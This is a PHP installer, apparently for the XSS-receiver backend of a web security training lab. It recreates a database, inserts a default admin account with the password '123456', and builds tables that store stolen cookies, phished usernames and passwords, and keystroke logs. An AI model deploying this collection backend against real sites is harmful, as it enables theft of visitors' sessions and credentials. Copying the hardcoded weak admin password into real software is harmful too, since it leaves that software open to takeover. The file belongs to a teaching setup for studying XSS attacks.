<?php
/**
 * Created by runner.han
 * There is nothing new under the sun
 */

include_once "inc/config.inc.php";
$dbhost=DBHOST;
$dbuser=DBUSER;
$dbpw=DBPW;
$dbname=DBNAME;
$mes_connect='';
$mes1='';
$mes2='';
$mes_ok='';

if(isset($_POST['submit'])) {
    //判断数据库连接
    if (!@mysqli_connect($dbhost, $dbuser, $dbpw)) {
        exit('数据连接失败，请仔细检查inc/config.inc.php的配置');
    }
    $link = mysqli_connect(DBHOST, DBUSER, DBPW);
    $mes_connect .= "<p class='notice'>数据库连接成功!</p>";
    //如果存在,则直接干掉
    $drop_db = "drop database if exists $dbname";
    if (!@mysqli_query($link, $drop_db)) {
        exit('初始化数据库失败，请仔细检查当前用户是否有操作权限');
    }
    //创建数据库
    $create_db = "CREATE DATABASE $dbname";
    if (!@mysqli_query($link, $create_db)) {
        exit('数据库创建失败，请仔细检查当前用户是否有操作权限');
    }
    $mes_create = "<p class='notice'>新建数据库:" . $dbname . "成功!</p>";
    //创建数据.选择数据库
    if (!@mysqli_select_db($link, $dbname)) {
        exit('数据库选择失败，请仔细检查当前用户是否有操作权限');
    }

    //创建users表
    $creat_users =
        "CREATE TABLE IF NOT EXISTS `users` (
    `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
    `username` varchar(30) NOT NULL,
    `password` varchar(66) NOT NULL,
    `level` int(11) NOT NULL,
    PRIMARY KEY (`id`)
    ) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=4";
    if (!@mysqli_query($link, $creat_users)) {
        exit('创建users表失败，请仔细检查当前用户是否有操作权限');
    }

    //往users表里面插入默认的数据
    $insert_users = "insert into `users` (`id`,`username`,`password`,`level`) values (1,'admin',md5('123456'),1)";


    if (!@mysqli_query($link, $insert_users)) {
        echo $link->error;
        exit('创建users表数据失败，请仔细检查当前用户是否有操作权限');
    }
    $mes1 = "<p class='notice'>新建数据库表users成功!</p>";

    //创建cookie结果表
    //time,ipaddress,cookie,referer,useragent
    $creat_cookieresult = "CREATE TABLE IF NOT EXISTS `cookies` (`id` int(10) unsigned NOT NULL AUTO_INCREMENT,`time` TIMESTAMP,`ipaddress` VARCHAR(50),`cookie` VARCHAR(1000),`referer` VARCHAR(1000),`useragent` VARCHAR(1000),PRIMARY KEY (`id`))";
    if (!@mysqli_query($link, $creat_cookieresult)) {
        exit('创建cookie表失败，请仔细检查当前用户是否有操作权限');
    }

    //创建xfish结果表
    $creat_xfish = "CREATE TABLE IF NOT EXISTS `fish` (`id` int(10) unsigned NOT NULL AUTO_INCREMENT,`time` TIMESTAMP,`username` VARCHAR(50),`password` VARCHAR(50),`referer` VARCHAR(1000),PRIMARY KEY (`id`))";
    if (!@mysqli_query($link, $creat_xfish)) {
        exit('创建fish表失败，请仔细检查当前用户是否有操作权限');
    }

    //创建键盘记录表
    $creat_keypress = "CREATE TABLE IF NOT EXISTS `keypress` (`id` int(10) unsigned NOT NULL AUTO_INCREMENT,`data` VARCHAR(1000),PRIMARY KEY (`id`))";
    if (!@mysqli_query($link, $creat_keypress)) {
        exit('创建keypress表失败，请仔细检查当前用户是否有操作权限');
    }



    $mes2 = "<p class='notice'>新建数据库表cookie,fish成功!</p>";
    $mes_ok="<p class='notice'>好了，可以了<a href='pkxss_login.php'>点击这里</a>进入首页</p>";
}
?>



<html>
<body>
<div class="page-content">

    <div id=install_main>
        <p class="main_title">Setup guide:</p>
        <p class="main_title">第0步：请提前安装“mysql+php+中间件”的环境;</p>
        <p class="main_title">第1步：请根据实际环境修改pkxss/inc/config.inc.php文件里面的参数;</p>
        <p class="main_title">第2步：点击“安装/初始化”按钮;</p>
        <form method="post">
            <input type="submit" name="submit" value="安装/初始化"/>
        </form>

    </div>
    <div class="info" style="color: #D6487E;padding-top: 40px;">
        <?php
        echo $mes_connect;
        echo $mes1;
        echo $mes2;
        echo $mes_ok;
        ?>

    </div>

</div><!-- /.page-content -->
</div>
</div><!-- /.main-content -->

</body>


</html>
